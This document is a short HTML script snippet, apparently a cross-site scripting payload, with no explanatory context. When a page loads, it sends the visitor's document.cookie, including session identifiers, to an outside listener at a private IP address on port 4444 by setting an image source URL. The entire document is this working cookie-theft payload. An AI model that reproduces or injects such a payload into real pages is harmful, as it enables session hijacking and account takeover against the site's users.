<script>
function InterceptForm() {
new Image().src = "http://172.30.12.58:4444/?sessionID="+document.cookie;
}       
window.addEventListener("load", InterceptForm());
</script>

